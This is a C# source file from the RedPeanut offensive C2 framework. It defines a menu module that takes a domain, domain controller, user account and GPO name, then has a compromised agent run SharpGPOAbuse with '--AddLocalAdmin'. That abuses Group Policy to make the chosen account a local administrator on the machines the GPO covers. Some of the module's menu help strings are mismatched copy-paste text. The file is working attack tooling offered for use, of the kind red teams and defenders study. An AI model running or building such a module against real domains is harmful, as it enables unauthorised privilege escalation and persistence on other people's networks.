//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using System;
using System.Collections.Generic;
using System.Linq;
using static RedPeanut.Utility;

namespace RedPeanut
{
    class SharpGPOAddLocalAdminManager : IMenu
    {
        public static Dictionary<string, string> mainmenu = new Dictionary<string, string>
        {
            { "set domaincontroller", "Payload type to use" },
            { "set domain", "Injection type" },
            { "set useraccount", "Process to spawn" },
            { "set gponame", "Process to spawn" },
            { "set force", "Process to spawn" },
            { "run", "Execute module" },
            { "options", "Print help" },
            { "back", "Back to lateral menu" }
        };

        IAgentInstance agent = null;
        string modulename = "gpoaddlocaladmin";
        string domainController;
        private string domain;
        private string userAccount;
        private string gpoName;
        bool force;

        bool exit = false;

        public SharpGPOAddLocalAdminManager()
        {

        }

        public SharpGPOAddLocalAdminManager(IAgentInstance agent)
        {
            this.agent = agent;
        }

        public void Execute()
        {
            exit = false;
            string input;
            SetAutoCompletionHandler(mainmenu);
            do
            {
                input = RedPeanutCLI(agent, modulename);
                GpoAbuseMenu(input);
            } while (!exit);
        }

        private void GpoAbuseMenu(string input)
        {
            string f_input = ParseSelection(input);

            if (!string.IsNullOrEmpty(input))
            {
                if (mainmenu.ContainsKey(f_input.TrimEnd()))
                {
                    switch (f_input.TrimEnd())
                    {
                        case "set domaincontroller":
                            domainController = GetParsedSetString(input);
                            break;
                        case "set domain":
                            domain = GetParsedSetString(input);
                            break;
                        case "set useraccount":
                            userAccount = GetParsedSetString(input);
                            break;
                        case "set gponame":
                            gpoName = GetParsedSetString(input);
                            break;
                        case "set force":
                            force = GetParsedSetBool(input);
                            break;
                        case "run":
                            Run();
                            break;
                        case "options":
                            PrintCurrentConfig();
                            break;
                        case "info":
                            PrintOptions("info", mainmenu);
                            break;
                        case "back":
                            Program.GetMenuStack().Pop();
                            exit = true;
                            return;
                        default:
                            Console.WriteLine("We had a woodoo");
                            break;
                    }
                }
                else
                {
                    PrintOptions("Command not found", mainmenu);
                }
            }
        }

        private void Run()
        {
            if(!string.IsNullOrEmpty(gpoName) && !string.IsNullOrEmpty(userAccount))
            {
                List<string> args = new List<string>();
                args.Add("--AddLocalAdmin");
                args.Add("--GPOName");
                args.Add(gpoName);
                args.Add("--UserAccount");
                args.Add(userAccount);

                if (!string.IsNullOrEmpty(domain))
                {
                    args.Add("--Domain");
                    args.Add(domain);
                }

                if (!string.IsNullOrEmpty(domainController))
                {
                    args.Add("--DomainController");
                    args.Add(domainController);
                }

                if (force)
                    args.Add("--Force");

                RunAssembly(PL_MODULE_SHARPGPOABUSE, "SharpGPOAbuse.Program", args.ToArray<string>(), agent);
            }
        }

        private void PrintCurrentConfig()
        {
            Dictionary<string, string> properties = new Dictionary<string, string>
            {
                { "domaincontroller", domainController },
                { "domain", domain },
                { "gponame", gpoName },
                { "useraccount", userAccount },
                { "force", force.ToString() }
            };

            Utility.PrintCurrentConfig(modulename, properties);
        }
    }
}

